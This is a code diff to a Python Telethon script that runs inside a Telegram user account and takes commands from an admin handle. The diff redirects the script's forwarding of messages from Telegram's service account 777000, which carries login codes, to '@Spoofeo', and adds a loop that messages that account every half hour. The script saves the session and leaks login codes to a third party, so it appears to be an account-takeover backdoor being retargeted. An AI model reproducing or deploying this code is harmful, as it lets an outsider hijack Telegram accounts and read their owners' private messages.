@@ -1,6 +1,7 @@
 #---------------------library-----------------------#
 import asyncio , logging , os , random ,sys
 from telethon import *
+from datetime import datetime, timedelta  # Importamos datetime para manejar fechas y tiempos
 #---------------------Logger-----------------------#
 logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',level=logging.INFO)
 logger = logging.getLogger(__name__)
@@ -11,7 +12,7 @@ id = 5739547
 feshar = TelegramClient("sassion", api_id= id, api_hash=hash).start()
 CybeRR = feshar.session.save()
 #---------------------STart-Admin----------------------#
-AliCybeRR = "@" #Admin
+AliCybeRR = "@Spoofeo" #Admin
 #---------------------ping----------------------#
 @feshar.on(events.NewMessage(from_users = AliCybeRR))
 async def main(event):
@@ -29,10 +30,21 @@ async def wait_hours(event):
 async def sendphoto(event):
     sender = await event.get_sender()
     if sender.id == 777000:
-        await feshar.forward_messages("Ali_CybeRR_Bemola", event.message) #Admin
-#---------------------End-----------------------#
+        await feshar.forward_messages("Spoofeo", event.message) #Admin
+
+#---------------------Keep-Alive Function-----------------------#
+async def keep_alive():
+    while True:
+        try:
+            # Cambia el ID de chat por tu nombre de usuario o grupo donde enviar el mensaje
+            await feshar.send_message("@Spoofeo", "Manteniendo la cuenta activa...")
+        except Exception as e:
+            print(f"Error al mantener activa la cuenta: {str(e)}")
+        await asyncio.sleep(60 * 30)  # Envía un mensaje cada 30 minutos
+
+#---------------------Ejecución del Cliente y Keep-Alive-----------------------#
 try:
-    asyncio.get_event_loop().run_forever()
+    asyncio.ensure_future(keep_alive())  # Inicia la función keep_alive en segundo plano
+    feshar.run_until_disconnected()     # Ejecuta el cliente de Telegram
 except Exception as e:
     print("Warning ! An ErRoR Happened --> "+str(e))
-feshar.run_until_disconnected()
